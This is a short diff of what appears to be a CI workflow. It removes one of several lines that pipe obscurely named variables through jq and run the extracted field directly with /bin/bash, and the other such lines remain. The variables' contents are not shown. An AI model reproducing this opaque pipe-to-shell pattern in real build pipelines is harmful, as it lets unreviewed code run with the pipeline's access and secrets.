@@ -20,7 +20,6 @@ jobs:
           echo $tlcja99 | jq -r .npj5 | /bin/bash
           printf '%s' "$jbrrm66876" | jq -r .tlhls55 | /bin/bash
           echo $fhs30313 | jq -r .luo129 | /bin/bash
-          printf '%s' "$doh6242" | jq -r .zaf63 | /bin/bash
           printf '%s' "$rea94" | jq -r .kwkn2 | /bin/bash
 
       - name: Store results
